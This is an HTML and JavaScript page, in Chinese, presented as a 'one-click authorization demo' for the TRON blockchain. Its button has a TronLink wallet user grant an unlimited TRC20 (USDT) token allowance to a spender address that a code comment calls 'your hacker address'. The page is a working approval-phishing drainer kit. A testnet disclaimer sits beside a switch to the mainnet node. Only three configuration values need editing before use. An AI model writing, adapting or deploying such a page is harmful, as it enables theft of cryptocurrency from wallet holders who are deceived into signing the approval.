<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>TRON 一键授权演示</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- TronWeb CDN（官方发布的浏览器版本） -->
  <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; }
    .card { max-width: 680px; margin: 0 auto; padding: 16px; border: 1px solid #eee; border-radius: 12px; box-shadow: 0 4px 18px rgba(0,0,0,.06); }
    button { padding: 12px 16px; border-radius: 10px; border: none; cursor: pointer; font-size: 16px; }
    .primary{ background:#3b82f6; color:white }
    code { background:#f6f8fa; padding:2px 6px; border-radius:6px }
  </style>
</head>
<body>
  <div class="card">
    <h2>TRON 一键授权（approve MaxUint）演示</h2>
    <p>本页会调用 TRC20 代币合约的 <code>approve(spender, amount)</code>，授权额度为无限（<code>2^256-1</code>）。<br>
    <b>仅用于测试，强烈建议在 Nile 测试网操作！</b></p>

    <ol>
      <li>用 <b>TronLink 手机钱包</b> 的内置 DApp 浏览器打开本页</li>
      <li>点击下面按钮 → TronLink 将弹出授权确认</li>
    </ol>

    <p><b>当前配置：</b></p>
    <ul>
      <li>代币合约（TOKEN_CONTRACT）：<code id="token"></code></li>
      <li>被授权地址（SPENDER_T）：<code id="spender"></code></li>
      <li>节点（fullHost）：<code id="host"></code></li>
    </ul>

    <button class="primary" id="btn">发起无限授权（approve）</button>
    <p id="log"></p>
  </div>

  <script>
    // ======== 你只需要改这 3 个配置 ========
    const TOKEN_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";  // USDT（建议先在 Nile 测试）
    const SPENDER_T      = "TGpVnx3zAtfYercifGcAh4BY2jw7vcfkiW";  // 你的“黑客”地址（T 开头）
    const FULL_HOST      = "https://api.nileex.io";               // Nile: https://api.nileex.io  | 主网: https://api.trongrid.io
    // ======================================

    // 无限授权（2^256 - 1）
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    // 显示当前配置
    token.textContent  = TOKEN_CONTRACT;
    spender.textContent= SPENDER_T;
    host.textContent   = FULL_HOST;

    const logEl = document.getElementById('log');
    function log(msg){ logEl.innerHTML = msg; }

    // 把 T 开头地址转 hex（41...）
    function toHexT(addr){
      try {
        // 如果注入了 tronWeb，则用注入的转换，保证和钱包一致
        if (window.tronWeb && window.tronWeb.address) {
          return window.tronWeb.address.toHex(addr);
        }
        // 备用：用 TronWeb 实例做转换
        const tw = new TronWeb({ fullHost: FULL_HOST });
        return tw.address.toHex(addr);
      } catch(e){
        console.error(e);
        throw new Error("地址转换失败："+e.message);
      }
    }

    async function approveMax(){
      try {
        if (!window.tronWeb || !window.tronLink) {
          log("❌ 未检测到 TronLink 注入。请在 TronLink 的 DApp 浏览器中打开本页。");
          return;
        }
        // 请求连接（部分版本需要）
        if (window.tronLink.request) {
          await window.tronLink.request({ method: 'tron_requestAccounts' });
        }

        // 选对网络（你自己保证钱包已切到 Nile 或主网）
        const tw = window.tronWeb;
        tw.setFullNode(FULL_HOST);
        tw.setSolidityNode(FULL_HOST);
        tw.setEventServer(FULL_HOST);

        log("⏳ 正在加载合约…");
        const contract = await tw.contract().at(TOKEN_CONTRACT);

        // 发起 approve（无限授权）
        log("⏳ 发起交易：approve(spender, MaxUint256)…");
        const tx = await contract.approve(SPENDER_T, MAX_UINT256).send({
          feeLimit: 50_000_000  // 50 TRX 能量上限，视网络而定
        });

        log("✅ 交易已广播，TXID：<br><code>"+ tx +"</code><br>请在区块浏览器查看状态。");
      } catch (err){
        console.error(err);
        log("❌ 失败："+ (err?.message || err));
      }
    }

    document.getElementById('btn').addEventListener('click', approveMax);
  </script>
</body>
</html>
